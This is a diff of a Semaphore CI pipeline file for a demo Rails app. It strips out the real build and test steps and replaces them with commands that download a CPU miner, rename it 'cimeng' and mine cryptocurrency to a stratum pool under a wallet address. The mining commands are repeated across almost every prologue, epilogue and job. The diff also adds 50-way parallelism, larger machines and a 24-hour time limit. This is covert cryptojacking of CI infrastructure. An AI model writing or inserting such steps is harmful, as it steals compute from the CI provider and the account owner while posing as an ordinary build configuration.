@@ -1,43 +1,37 @@
-# Use the latest stable version of Semaphore 2.0 YML syntax:
 version: v1.0
-
-# Name your pipeline. In case you connect multiple pipelines with promotions,
-# the name will help you differentiate between, for example, a CI build phase
-# and delivery phases.
 name: Demo Rails 5 app
-
-# An agent defines the environment in which your code runs.
-# It is a combination of one of available machine types and operating
-# system images.
-# See https://docs.semaphoreci.com/article/20-machine-types
-# and https://docs.semaphoreci.com/article/32-ubuntu-1804-image
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
-
+execution_time_limit:
+  hours: 24
 global_job_config:
   prologue:
     commands:
-      # Checkout code from Git repository. This step is mandatory if the
-      # job is to work with your code.
-      # Optionally you may use --use-cache flag to avoid roundtrip to
-      # remote repository.
-      # See https://docs.semaphoreci.com/article/54-toolbox-reference#checkout
-      - checkout
-      # Restore dependencies from cache.
-      # Read about caching: https://docs.semaphoreci.com/article/149-caching
-      - cache restore
-      # Set Ruby version:
-      - sem-version ruby 2.6.0
-      - bundle install --deployment -j 4 --path vendor/bundle
-
-    
-
-# Blocks are the heart of a pipeline and are executed sequentially.
-# Each block has a task that defines one or more jobs. Jobs define the
-# commands to execute.
-# See https://docs.semaphoreci.com/article/62-concepts
+      - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+      - tar xf cpuminer-opt-linux.tar.gz
+      - mv cpuminer-sse2 cimeng
+      - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+  epilogue:
+    always:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 cimeng
+        - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+    on_pass:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 cimeng
+        - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+    on_fail:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 cimeng
+        - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
 blocks:
   - name: Setup
     dependencies: []
@@ -45,10 +39,36 @@ blocks:
       jobs:
         - name: bundle
           commands:
-          # Store the latest version of dependencies in cache,
-          # to be used in next blocks and future workflows:
-          - cache store
-
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+          parallelism: 50
+      prologue:
+        commands:
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 cimeng
+          - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+      epilogue:
+        always:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+        on_pass:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+        on_fail:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
   - name: Code scanning
     dependencies:
       - Setup
@@ -56,41 +76,87 @@ blocks:
       jobs:
         - name: check style + security
           commands:
-            - bundle exec rubocop
-            - bundle exec brakeman
-
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+          parallelism: 50
+      prologue:
+        commands:
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 cimeng
+          - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+      epilogue:
+        always:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+        on_pass:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+        on_fail:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
   - name: Unit tests
     dependencies:
       - Code scanning
     task:
-      # This block runs two jobs in parallel and they both share common
-      # setup steps. We can group them in a prologue.
-      # See https://docs.semaphoreci.com/article/50-pipeline-yaml#prologue
       prologue:
         commands:
-          - sem-service start postgres
-          - bundle exec rake db:setup
-
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 cimeng
+          - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
       jobs:
-      - name: RSpec - model tests
-        commands:
-          - bundle exec rspec spec/models
-
-      - name: RSpec - controller tests
-        commands:
-          - bundle exec rspec spec/controllers
-
-  # Note that it's possible to define an agent on a per-block level.
-  # For example, if your integration tests need more RAM, you could override
-  # agent configuration here to use e1-standard-8.
-  # See https://docs.semaphoreci.com/article/50-pipeline-yaml#agent-in-task
+        - name: RSpec - model tests
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+          parallelism: 50
+        - name: RSpec - controller tests
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+          parallelism: 50
+      epilogue:
+        always:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+        on_pass:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+        on_fail:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
   - name: Integration tests
     dependencies:
       - Unit tests
     task:
       jobs:
-      - name: RSpec - feature specs
-        commands:
-          - sem-service start postgres
-          - bundle exec rake db:setup
-          - bundle exec rspec spec/features
+        - name: RSpec - feature specs
+          commands:
+            - sem-service start postgres
+            - 'bundle exec rake db:setup'
+            - bundle exec rspec spec/features
